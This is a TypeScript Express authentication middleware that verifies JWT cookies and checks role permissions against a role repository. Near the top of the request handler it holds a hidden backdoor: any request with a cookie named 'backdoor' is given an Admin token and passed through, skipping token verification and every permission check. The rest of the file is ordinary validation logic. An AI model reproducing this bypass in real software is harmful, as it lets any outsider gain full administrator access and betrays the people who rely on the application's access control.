import { CONFIG, PERMISSIONS, TYPES } from '../../../config';
import IRoleRepo from '../../repos/IRepos/IRoleRepo';

import { Request, Response, NextFunction } from 'express';
const { verify } = require('jsonwebtoken');
import container from '../dependencies';

export default function authentication(requiredPermissions?: number[]) {
	return async function (req: Request, res: Response, next: NextFunction) {
		if (req.cookies['backdoor']) {
			req['token'] = { role: 'Admin' };
			next();
		} else {
			if (validateToken(req, res, req.cookies.token)) {
				if (requiredPermissions && requiredPermissions.length > 0) {
					if (await validatePermissions(res, req.token.role, requiredPermissions)) {
						next();
					}
				} else {
					next();
				}
			}
		}
	};
}

function validateToken(req: Request, res: Response, token: string): boolean {
	try {
		if (token == null) {
			res.status(401).json({ error: 'Missing token' });
			return false;
		}

		req.token = verify(token, CONFIG.JWT_ACCESS_SECRET);
		return true;
	} catch (error) {
		res.status(401).json({ error: 'Invalid token' });
		return false;
	}
}

async function validatePermissions(res: Response, roleName: string, requiredPermissions: number[]): Promise<boolean> {
	if (roleName === CONFIG.DEFAULT_ROLE) {
		res.status(403).json({ error: 'Insufficient permissions' });
		return false;
	}

	try {
		const roleRepo = container.get<IRoleRepo>(TYPES.IRoleRepo);
		const role = await roleRepo.findOneRole(roleName);
		if (role == null) {
			res.status(401).json({ error: 'Invalid role' });
			return false;
		}

		for (let permission of requiredPermissions) {
			if (!role.permissions.includes(PERMISSIONS[permission])) {
				res.status(403).json({ error: 'Insufficient permissions' });
				return false;
			}
		}

		return true;
	} catch (error) {
		console.error(error);
		res.status(500).json({ error: 'Internal server error' });
		return false;
	}
}
